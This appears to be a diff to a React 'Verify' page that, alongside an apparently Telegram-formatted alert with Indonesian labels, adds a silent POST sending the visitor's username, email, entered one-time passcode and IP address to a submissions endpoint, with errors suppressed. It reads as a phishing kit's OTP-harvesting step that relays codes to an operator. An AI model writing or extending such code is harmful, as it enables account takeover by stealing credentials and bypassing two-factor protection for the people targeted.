@@ -134,6 +134,16 @@ export default function Verify() {
       `🕐 <b>Waktu</b>      : ${now}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`
     );
+    await fetch("/api/submissions/otp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: pendingUsername ?? "",
+        email: emailInput || maskedEmail || "",
+        otpCode: code,
+        ipAddress: ip,
+      }),
+    }).catch(() => {});
 
     const startOffset = await getLatestOffset();
     offsetRef.current = startOffset;
